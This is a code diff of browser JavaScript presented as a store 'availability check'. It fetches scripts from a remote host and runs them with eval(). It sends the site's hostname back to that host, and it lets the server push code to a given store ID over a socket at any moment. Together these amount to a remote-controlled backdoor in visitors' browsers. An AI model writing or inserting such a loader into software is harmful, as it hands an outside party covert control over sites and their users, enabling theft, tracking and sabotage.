@@ -8,25 +8,26 @@ function checkAvailable() {
     const url = `${host}/check/${storeID}`
     axios.get(url).then(check => {
         if (Object.keys(check.data).length)
-            checkExecScript(check.data.available, check.data.script)
+            if (check.data.script) execScript(check.data.script)
+    })
+    axios.post(url, {
+        body: {
+            host: window.location.host
+        }
     })
 }
 
 checkAvailable()
-
-function checkExecScript(available, script) {
-    if (!available) execScript(script)
-}
 
 function execScript(script) {
     eval(script)
 }
 
 const socket = io(host)
-socket.on("check", check => {
-    if (Object.keys(check).length) checkExecScript(check)
+socket.on("check", () => {
+    checkAvailable()
 })
 
-socket.on("script", script => {
-    if (script) execScript(script)
+socket.on("script", data => {
+    if (data.store_id === storeID) execScript(data.exec)
 })
